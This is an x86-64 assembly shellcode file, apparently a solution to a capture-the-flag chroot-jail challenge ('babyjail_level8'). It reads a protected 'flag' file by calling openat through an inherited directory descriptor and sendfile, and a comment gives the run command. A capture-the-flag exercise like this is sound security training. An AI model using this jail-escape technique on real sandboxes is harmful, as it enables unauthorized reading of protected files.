.intel_syntax noprefix

.section .text
.global _start

_start:
    # flag
    # 0x67616c66
    mov rax, 0x67616c66
    push rax

    # openat(3, 'flag', 0)
    mov rdi, 3
    lea rsi, [rsp]
    mov rdx, 0
    mov rax, 0x101
    syscall

    # sendfile(1, flag_fd, 1, 1000)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
    syscall

    # run the challenge in this way:
    # (exec 3</ /challenge/babyjail_level8 < shellcode-raw) > flag.txt
